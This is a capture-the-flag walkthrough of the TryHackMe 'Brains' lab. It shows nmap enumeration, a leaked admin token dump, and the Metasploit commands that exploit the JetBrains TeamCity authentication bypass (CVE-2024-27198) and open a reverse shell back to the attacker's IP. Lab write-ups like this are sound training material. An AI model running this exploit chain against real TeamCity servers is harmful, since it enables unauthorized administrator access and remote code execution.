# 🧠 TryHackMe — Brains

> **Room:** [Brains](https://tryhackme.com/room/brains)  
> **Difficulty:** Medium  
> **Tags:** `TeamCity` `CVE-2024-27198` `Metasploit` `Apache Tomcat` `Privilege Escalation` `Multi-VM`
>
> This room covers the **JetBrains TeamCity authentication bypass** (CVE-2024-27198) against a two-VM lab. We enumerate the targets, exploit the vulnerable TeamCity instance with Metasploit, grab the user flag, then pivot to the second VM to answer follow-up questions.

---

## 📖 Table of Contents

1. [Lab Setup](#-lab-setup)
2. [Reconnaissance — Nmap Scan](#-reconnaissance--nmap-scan)
3. [Identifying the Vulnerability](#-identifying-the-vulnerability)
4. [Exploitation with Metasploit](#-exploitation-with-metasploit)
5. [User Flag](#-user-flag)
6. [Second VM — The Questions](#-second-vm--the-questions)
7. [Key Takeaways](#-key-takeaways)

---

## 🖥️ Lab Setup

This room uses **two VMs** (you start with the first one), plus your AttackBox:


| Role                                 | IP                |
| ------------------------------------ | ----------------- |
| **Target 1** (vulnerable TeamCity)   | `10.128.129.166`  |
| **Target 2** (questions / port 8000) | `10.128.164.219`  |
| **My machine (attacker)**            | `192.168.136.207` |


> ⚠️ **Important:** You must **power off the first VM before starting the second one** — the room only runs one target at a time.

---

## 🔍 Reconnaissance — Nmap Scan

As always, we start with a full TCP port scan to map the attack surface:

```bash
nmap -sC -sV -p- -oN nmap/brains.txt 10.128.129.166
```

**Results:**

```text
PORT      STATE  SERVICE  VERSION
20/tcp    closed ftp-data
80/tcp    open   http     Apache httpd 2.4.41 ((Ubuntu)
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
50000/tcp open   http     Apache Tomcat (language: en)
| http-title: Log in to TeamCity &mdash; TeamCity
|_Requested resource was /login.htm
```

**What we learn:**

- **Port 80** — an Apache page showing *Maintenance*. Nothing interesting here, it's a dead end.
- **Port 50000** — an **Apache Tomcat** server exposing a **JetBrains TeamCity** login page. This is our way in.

> 💡 **Tip:** Port `50000` is TeamCity's default port. Whenever you see a TeamCity login page on a CTF, immediately check for **CVE-2024-27198 / CVE-2024-27199** — a path traversal authentication bypass affecting TeamCity versions **before 2023.11.4**.

---

## 🐛 Identifying the Vulnerability

The TeamCity instance is vulnerable to **CVE-2024-27198**, an authentication bypass that lets an unauthenticated attacker access the REST API and create administrator users — effectively giving full control of the server.

Confirming the misconfiguration (user/token dump):

```text
[+] User ID: 1     Username: administrator        Email:                    Tokens:                Roles: SYSTEM_ADMIN
[+] User ID: 11    Username: rcity_rules_179      Email: email@email.com    Tokens: 4s3W66rEA9      Roles: SYSTEM_ADMIN
```

We now have a **SYSTEM\_ADMIN** username and its access token — but Metasploit makes this even easier with a ready-made module.

---

## 💥 Exploitation with Metasploit

Metasploit ships an official module for this CVE that performs the whole chain (bypass → admin token → RCE) automatically.

```bash
msfconsole
```

```text
msf6 > search teamcity

msf6 > use multi/http/teamcity_auth_bypass_cve_2024_27198

msf6 exploit(multi/http/teamcity_auth_bypass_cve_2024_27198) > set RHOSTS 10.128.129.166
msf6 exploit(multi/http/teamcity_auth_bypass_cve_2024_27198) > set LHOST 192.168.136.207
msf6 exploit(multi/http/teamcity_auth_bypass_cve_2024_27198) > run
```

**Settings explained:**


| Option   | Value             | Purpose                               |
| -------- | ----------------- | ------------------------------------- |
| `RHOSTS` | `10.128.129.166`  | The vulnerable TeamCity server        |
| `LHOST`  | `192.168.136.207` | My attacker IP for the callback shell |


If everything goes well, the module exploits the authentication bypass, creates an admin user/token, and drops us straight into a **shell as `tcuser`** 🎉

---

## 🚩 User Flag

Once we have our shell, we hunt for the flag:

```bash
find / -name "flag.txt" 2>/dev/null
```

Reading it:

```bash
cat flag.txt
```

**Flag:**

```text
THM{*********}
```

---

## 🔄 Second VM — The Questions

With the flag captured, it's time to switch targets:

1. **Power off the first machine** (`10.128.129.166`).
2. **Start the second machine** — `10.128.164.219`.
3. Connect to the service listening on **port 8000**:

```text
http://10.128.164.219:8000
```

4. Enter the **connection credentials provided in the room**, and use the resulting access to answer the remaining questions.

> 💡 This second phase tests your understanding of the exploit chain rather than a new vulnerability — make sure you understood *how* the TeamCity bypass worked in phase one.

---
